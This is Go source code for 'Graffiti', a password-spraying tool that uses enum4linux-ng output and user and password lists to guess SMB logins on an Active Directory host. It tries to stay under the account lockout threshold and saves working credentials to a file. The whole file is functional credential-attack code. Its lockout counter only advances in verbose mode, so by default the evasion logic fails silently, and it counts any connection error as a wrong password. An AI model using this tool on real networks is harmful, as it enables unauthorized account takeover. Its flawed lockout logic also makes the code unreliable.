package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"time"

	"github.com/sorrence/graffiti/internal/console"
	"github.com/sorrence/graffiti/internal/parser"
	"github.com/sorrence/graffiti/internal/policy"
	"github.com/sorrence/graffiti/internal/wordlist"

	"github.com/hirochachacha/go-smb2"
	"github.com/spf13/pflag"
)

func main() {
	var (
		inputFile = pflag.StringP("input", "i", "", "enum4linux-ng JSON/YAML output")
		userlist  = pflag.StringP("userlist", "u", "", "user list")
		passlist  = pflag.StringP("passlist", "p", "", "raw password list")
		outFile   = pflag.StringP("output", "o", "output.txt", "file for successful logins")
		_         = pflag.Int("min-length", 0, "minimum password length (override)")
		_         = pflag.Int("lockout-threshold", 0, "lockout threshold (override)")
		_         = pflag.Duration("delay", 0, "delay between attempts (override)")
		verbose   = pflag.BoolP("verbose", "v", false, "verbose mode")
	)
	pflag.Parse()

	if *inputFile == "" || *passlist == "" || *userlist == "" {
		fmt.Fprintln(os.Stderr, getHelp())
		os.Exit(1)
	}

	result, err := parser.ParseFile(*inputFile)
	if err != nil {
		fmt.Fprintln(os.Stderr, console.Status("[-]", "Parse error: %v", err))
		os.Exit(1)
	}

	pol := policy.Extract(result.Policy)
	cfg := policy.BuildConfig(pflag.CommandLine, pol)

	fmt.Println(console.Status("[+]", "Using minimum length: %d, lockout threshold: %d, delay: %s",
		cfg.MinLength, cfg.LockoutThreshold, cfg.Delay))

	passwords, err := wordlist.Filter(*passlist, cfg, pol.ComplexityOn)
	if err != nil {
		fmt.Fprintln(os.Stderr, console.Status("[-]", "Filtering error: %v", err))
		os.Exit(1)
	}

	users, err := readLines(*userlist)
	if err != nil {
		fmt.Fprintln(os.Stderr, console.Status("[-]", "Could not read user list: %v", err))
		os.Exit(1)
	}

	fmt.Println(console.Status("[+]", "Testing %d users with %d passwords.", len(users), len(passwords)))

	out, err := os.OpenFile(*outFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Fprintln(os.Stderr, console.Status("[-]", "Could not open output file: %v", err))
		os.Exit(1)
	}
	defer out.Close()

	passwordSpray(result.Target.Host, users, passwords, cfg, out, *verbose)
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if line := sc.Text(); line != "" {
			lines = append(lines, line)
		}
	}
	return lines, sc.Err()
}

func passwordSpray(targetHost string, users []string, passwords []string, cfg policy.Config, out *os.File, verbose bool) {
	addr := targetHost + ":445"

	// Failed-attempt counter for each user. It removes the user from the
	// candidate list before the lockout threshold is reached.
	failCount := make(map[string]int)

	for _, pw := range passwords {
		for _, user := range users {
			if cfg.LockoutThreshold > 0 && failCount[user] >= cfg.LockoutThreshold-1 {
				// Skip the user while leaving one attempt before the threshold.
				continue
			}

			ok, err := trySMBAuth(addr, user, pw)
			if err != nil {
				fmt.Println(console.Status("[!]", "Connection error (%s): %v", user, err))
				// A connection error is not an authentication failure, so do not count it.
				continue
			}

			if ok {
				fmt.Println(console.Status("[+]", "Success: %s:%s", user, pw))
				fmt.Fprintf(out, "%s:%s\n", user, pw)
				// A valid password was found for this user; skip later passwords.
				failCount[user] = cfg.LockoutThreshold // exclude from future rounds
			} else if verbose {
				failCount[user]++
				fmt.Println(console.Status("[-]", "Failed: %s:%s", user, pw))
			}

			if cfg.Delay > 0 {
				time.Sleep(cfg.Delay)
			}
		}
	}
}

// trySMBAuth tries one username/password combination.
// It returns whether authentication succeeded and any network or unexpected error.
// An authentication rejection (incorrect password) returns (false, nil).
func trySMBAuth(addr, user, password string) (bool, error) {
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return false, fmt.Errorf("TCP connection: %w", err)
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     user,
			Password: password,
		},
	}

	session, err := d.Dial(conn)
	if err != nil {
		// go-smb2 also returns authentication rejections as generic errors;
		// treat them as authentication failures here.
		// To distinguish actual network/protocol errors, inspect the error
		// message (for example, "STATUS_LOGON_FAILURE").
		return false, nil
	}
	defer session.Logoff()

	return true, nil
}

func getHelp() string {
	return `Graffiti - Active Directory password testing tool

Usage:
  graffiti -i enum.json -u users.txt -p rockyou.txt

Flags:
  -i, --input string          enum4linux-ng JSON/YAML output (required)
  -u, --userlist string       user list (required)
  -p, --passlist string       raw password list (required)
  -o, --output string         file for successful logins (default: output.txt)
	  --min-length int        minimum password length (override)
	  --lockout-threshold int lockout threshold (override)
	  --delay duration        delay between attempts (override)`
}
